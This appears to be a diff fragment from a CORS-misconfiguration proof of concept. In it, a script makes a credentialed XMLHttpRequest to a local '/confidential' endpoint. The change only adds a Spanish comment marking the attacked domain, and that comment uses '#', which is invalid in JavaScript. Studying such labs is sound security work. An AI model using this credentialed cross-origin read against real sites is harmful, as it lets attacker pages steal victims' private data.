@@ -4,7 +4,7 @@
 <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('GET', 'http://localhost:5000/confidential', true);
+req.open('GET', 'http://localhost:5000/confidential', true); # Dominio atacado
 req.withCredentials = true;
 req.send();
 
